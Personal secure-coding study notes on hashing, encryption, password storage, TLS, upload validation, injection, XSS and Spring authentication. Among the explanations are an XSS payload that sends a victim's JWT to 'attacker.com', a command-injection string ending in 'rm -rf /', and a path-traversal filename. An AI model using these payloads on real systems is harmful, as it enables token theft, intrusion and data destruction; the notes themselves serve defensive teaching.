Secure Coding notes.txt
=== context food for your AI friend tomorrow

=== base64encoding = transform a series of bytes into a sequence of characters in a certain alphabet (eg: A-Z, a-z, 0-9, +, /)
=== checksum (eg CRC, SHA) 
  - one part of the data is used to check there for typos in the remaining text
  - RO[49]BTRLRONCRT0211064001 -> 49 is the checksum https://wise.com/gb/iban/checker

=== salting/nonce = add random string to increase the entropy to defend against rainbow table attacks
  - this string is harder to attack by letter frequency
  - adding 1 random letter in between any other 2 = 
  - tahbics sdterfignhg ijs hkalrmdneor tpo aqtrtsaucvk bwy lxeytztqerr farbecqdueefngchy

=== encryption = hide/protect sensitive data

=== symmetric encryption = same K is used for encryption and decryption
  - you need a large key; rotate it
  - very fast, CPU-efficient

=== asymmetric encryption
  = what is encrypted with the public key can only be decrypted with the private key and vice versa
  - private key (v) = only you have it, keep it secret (eg: USB stick, on your drive, on your badge)
  - public key (p) = everyone can have it, share it freely

=== A) Storing a password to validate an incoming password
  - Storing Human User Password in the DB (= Antipattern)
    ‚ò¢Ô∏è Humans suck at finding passwords: One pass in all systems; when expired vic08REN! -> ic08REN!v
    ‚úÖ DON'T, use SSO!
  - to check if the user:pass combination they give ‚≠êÔ∏èmatches‚≠êÔ∏è what you know => don't ENCRYPT password, but bcrypt them
  - practical example: actuator using Basic Authorization with user/pass, checked vs {bcrypt}-ed password in your properties
  USER table:
  | id | username | plain-text password | encrypted password  using the same nonce|
  |----|----------|---------------------|----
  | 1  | alice    | password123         | oeuty47934y975263579
  | 2  | bob      | password123         | oeuty47934y975263579

  - how to increase the strength of existing user bcrypted passwords?
    - ‚ùåforcefully ask all users to rest their passwordsüò±ü§¢ü§¢ü§¢ü§Æü§Æü§Æ
    - ‚úÖat the very next login, when plaintext password comes in on the network, check the strength of the bcrypted value in DB and if < 12, re-bcrypt(12) => overwrite the DB value

=== B) Storing a password to send to another system
  - You need the plain-text password. 
  - Where to store it/get it from?
  > environment variables export DB_PASSWORD 
  > startup.sh on prod mahine: command line java -jar -Ddb.password=08927
  > Vault ‚≠êÔ∏è
    + no plain text on some random machine
    + `top` prints java command line including -Ddb.password
    + write history/audit: what user changed that password + when 
    + read access history: when was this key actually last used?
    + key rotation [even without instances' restart]

=== The GDPR "right to be forgotten"
  - hard if custoemr data stored in 10 DB on 3 continents, 3 Kafka brokers and 1 Rabbit, + a data lake
  - All the data you ever store about that single customer, wherever you store it or send it on message or wherever it is, it is encrypted with the same personal symmetric key of that human. If they come to you and they want to be forgotten, you just burn the key. And there is a central system which manages the GDPR PII keys of all the individuals, and you just have to go to that system, nuke the key, and you've forgotten the guy. 
  - Also avoid copying the information of that person all over the place, especially in clouds. You anonymize and de-anonymize when you go off or back on prem. 


=== Hashing
  - Features:
    - highly sensitive to changes
    - one-way (can't get the original data)‚ùå
    - low-collision
  - Example algorithms: 
    - MD5(‚ò†Ô∏èRIP)
    - SHA-256, -512 bits = 64 bytes
  - Practical use-case: 
    - comparing big data sets: 
    hash(payments_10G_1.xml) === hash(payments_10G_2.xml) 
      => very very very...very likely they contents are the same.
    utorrent

=== Digital Signature
  you receive a .pdf (1MB) from IRS
  - Goal1: non-repudiation = prove in court that the sender of M is IRS
  - Goal2: integrity protection = no one tampered the M contents
  - you get M + sha(M) = not enough: a üòàMan in the middle could swap originals with M' + sha(M')
  - you get M + enc(sha(M),v_irs)
  - a digital signature =  hash(message) asym encrypted with senders' private key
  #1‚úÖ: you honour, if I take dec(enc(sha(M),v_irs),p_irs) = sha(M)
  #2‚úÖ: üòàchanges M->M'; you received M' + enc(sha(M),v_irs) => 
          dec(enc(sha(M),v_irs),p_irs) = sha(M) != sha(M') => tampered with!‚ùå
  ‚ò¢Ô∏è Collisions (don't use MD5). üòà finds a M' whose hash = M
  ‚ò¢Ô∏è üòà generates a new p_irs', v_irs' and provides me with a forged p_irs'

=== Propagate safely public keys
  - no public key shallt ever travel the network unsigned
  - CA (Certificate Authorities)
  - [p + digsig(p, CA)] = .cer
  - unsigned=self-signed certificate = no CA has signed that pub key

=== https:// = SSL/TLS
  - to open https: you have to get a .cer(pub key signed by a CA) issued for your host/domain by a CA. csr => infra team => .cer + private key
    - keep private key secret‚ö†Ô∏è in your cacerts
    - send your .cer to any party which recongizes its' signer CA
    ¬± add in your caller's cacerts the CA .cer as trusted
    - all .cer expire -> how to renew them?
  - all network traffic is sym encrypted with a session key established via the server's .cer = SSL handshake
  - to connect to you, the client jvm/browser must trust your .cer or your its' issuer CA  

=== 2TLS, two-way ssl, client-cert

=== Security by Obscurity = ‚ùåüí©üí©üí©üí©
  = Let's assume the hackers don't know our code base 
  - Because of the S-bomb and library vulnerabilities mania in the US, they decided to rewrite 15-year-old codebase of Java entirely in C++ without using any library or open source. WTFWTFWTFWTFWTFWTFWTFWTFWTFWTF; they reinvented wheel intead of updating their wheel

=== CVE handling
  - upgrade üëç
    - if libA -> libX.v1
    - libX.v1 (vulnerable) => v2 causes üí•Class/MethodNotFoundError in libA ar runtime
    - libA üîº, libB->libAüîº ... SpringBoot version++
    => testing again, bossüôÅ
    => Victor vulnerabilities are the best thing that happened to software crafters because now we have time to refactor everything when we upgrade Spring Boot. we'll test everything, anyway!
  - switch to another !worse libraryü§û
  - fix (DIY):
    > fork and fix
    > contribute a fix to OSS!
    > shadowing classes: reimplementing the same class in your src/main to replace the vulnerableü§¢ü§Æ
  - downgrade lib
  - ignoreü§û

=== file deserialization
  - XXE doctype /passwd
  - XML bomb expanding to 3 GB RAM OOM
  - YAML bomb
  - java de/serialization: save/load state a java instance as byte[] to eg a file/RMI in a Java-specific format

=== FILE VALIDATION
  - Check magic bytes (Tika), not just the file extension or Content-Type header
  - Whitelist allowed extensions ‚Äî whitelisting is always stronger than a denylist
  - Run an antivirus scan on uploaded content before processing

=== PATH TRAVERSAL
  - Never write to disk using the user-supplied filename ‚Äî it can escape the target directory (e.g. ../root/.bashrc)
  - Whitelist filename chars with a strict regex; blocking only ".." and "/" is weaker
  - Best fix: generate a random filename on disk (upload-<UUID>.dat), store the original name in the DB

=== SHELL / COMMAND INJECTION
  - Never concatenate user input into Runtime.exec() ‚Äî attackers inject extra commands (e.g. a & rm -rf /)
  - The random-filename fix above also eliminates this surface

=== DENIAL OF SERVICE
  - Memory: limit upload size (Tomcat default 2 MB) to prevent 500 concurrent x 2 MB = 1 GB OOM
  - Thread starvation: long processing on HTTP threads exhausts Tomcat's pool (200 threads)
    => liveness probes time out => Kubernetes kills the pod => fix with async offloading
  - Unbounded queue: ForkJoinPool.commonPool() has no queue limit
    => write to a temp file first, queue only a lightweight reference (e.g. a file path)
  - Disk exhaustion: clean up temp files after processing and enforce a max-age (e.g. 7 days)

=== RESILIENCE
  - In-memory async work is lost on crash or redeploy / rolling restart
  - Prefer durable async: publish to Rabbit/Kafka, or use the Inbox Table Pattern
    (insert a TASK(status=PENDING) row in DB so work survives restarts)

"auth"=?
  - authn authentication = who are you
  - authz authorization = what can you do?
    a) features
    b) on data (aka jurisdiction)
      Although your user has access to approve loans, you can only do that for the loans request submitted to your branch. Even worse, you can't even see the loan contracts of other branches.

=== XXS = X/Cross Site Scripting: via a stupid website/app, hacker runs scripts in the victim's browser
  - we need 2 users with access to an app: hacker + victim
  - the hacker injects a malicious script in app (eg: a comment on a blog post) which is saved in DB by the backend
  - the victim user later views that comment and the script runs in their browser  where is rendered with .innerHTML
  - Exploits: "what can the hacker's JS code do bad in the bro of the victim(admin)"
    a) fetch(POST, 'employee/{victimId}/salary/increase' {a lot})
    b) impersonate victim üëë againts the hacked app
    -> send out the victim's session cookie (JSSESSION)
      ‚ö†Ô∏èIMPOSSIBLE by default as that cookie is httpOnly=true ie not accessible from js code
    -> JWT AccessToken is stored in localStorage/var accessible (YUMMY)
    <img src="x" onerror="fetch('http://attacker.com/steal?cookie='+jwt +' usable for '+document.domain)"> for until jwt.exp = 5m..1h
    ! the JWT might be usable to more apps than the victim app
  - fixes:
    a) use Rich Text editor sending markdown‚ù§Ô∏è (‚àÑscripts) **bold** _italic_
    b) allow-list html tags using org.owasp.html.Sanitizers
      > done in BE whenever you receive/return HTML to FE
      > ‚≠êÔ∏è via an annotation on Dto + @Aspect
      > Paranoia: HttpFilter in Servlet that would automatically sanitize (allow list) any string in any JSON payload in a request or a response => one of those json fields contained encoded data that happened to contain "<"

=== CORS = Cross Origin Resource Sharing
  - Browsers will check with backend you want to call if they accept JS calls done by .js files loaded from a different domain


=== Patient Data Leak Vulnerability case study
  ‚ùå URL-scanning attack for sequential IDs
  - if a hacker sees a numeric id 1002 => they will ask for 1001, for>>
  - ORACLE reigns
  => use UUID v4/7 especially towards any WWW user / or an Intranet of 100.000 employees
  ‚ùå POST/PUT's body should NOT mirror data back to client. Design mistake; POST creates, not returns = CQRS style
  => dear FE (!not fullstack, jr FE), I don't need to give you back the patient data.  Just send it to me!
    have reads going only via GET (properly secured)

  - async handling of a create.X
  Usecase: In an e-shop, someone places an order, but the ID of the order gets generated after a rabbit queue, so you can't give the ID back to the UI. => go for client-generated UUIDs (generate the id before the rabbit)

=== Authn = who you are
  - we authenticate a "Principal" (human / machine)
  - Form to human - ‚ò¢Ô∏è‚ùådon't> let pros do it IdP Okta, KeyCloak, 2FA
  - Basic Auth: / https request header "Authorization: Basic base64(user:pass)"
    > legacy/ops endpoints
    curl http://localhost:8080/actuator/beans -u actuator:actuator         
    curl http://localhost:8080/actuator/beans -H "Authorization: Basic YWN0dWF0b3I6YWN0dWF0b3I="
  - ApiKey more opaque vs Basic for outside developers/users
    curl http://localhost:8080/api/trainings -H "x-api-key: strongapikey" -v
  - X.509 .cer
  - SAML2 aka WebSSO (single-sign-on per day for a human)
  - JWT OAuth AccessToken 
    "Authorization: Bearer <jwt>"
    JWT = JSON digitally signed by Okta
  - PreAuthenticated
    Implementing & configuring correctly parsing JWT  tokens/Basic/.cer is risky do reimplement in Spring/Quarkus/Ktor/py/c#/pearl.
    a) instead implement a lightweight 'security proxy' (eg in py) Make that security proxy the only process accessible in the operating system, and have the actual application running as another process called only locally by the security proxy within the same operating system.
    -- sends to your app on. headers 
    x-user
    x-user-roles (extracted from JWT token) 
    b) Istio

=== ThreadLocal 
  - Once you set such a variable to a value in a thread, later in that same thread you can get the variable out.  = immune to race conditions
  - uses in BE:
  a) MDC: %X{key} in logging patterns, after MDC.put("key", 1)
  b) SecurityContext
  c) @Transactional/JDBC Connection
  d) TraceID/OTEL

=== Spring Security
  - SecurityContextHolder.getContext().getAuthentication() = who is the current user
  - SecurityContextHolder.getContext().getAuthentication().getAuthorities() = what roles/permissions
  - ! mind changing the thread

=== Broken Authorization üëëüëë
  hide the button in FE, leave the BE unsecured
  üëç RULE: When you have to restrict security of your application, start with backend. See the error and then hide the button. 


=== coroutines + thread local in a spring app
  - https://docs.spring.io/spring-framework/reference/languages/kotlin/coroutines.html#coroutines.propagation


=== user role(s) comes from:
  - DB
  - from a LDAP call
  - JWT bearer

=== Authz = what you can do
  - permitall
  - url-based
  - annotation
  - propagation of SecurityContext
  - non-http

=== JWT design
  - online/offline validation
  - [a]symmetric signed
  - what payload
  - what expiration
  - JWT exchange 
  - JWE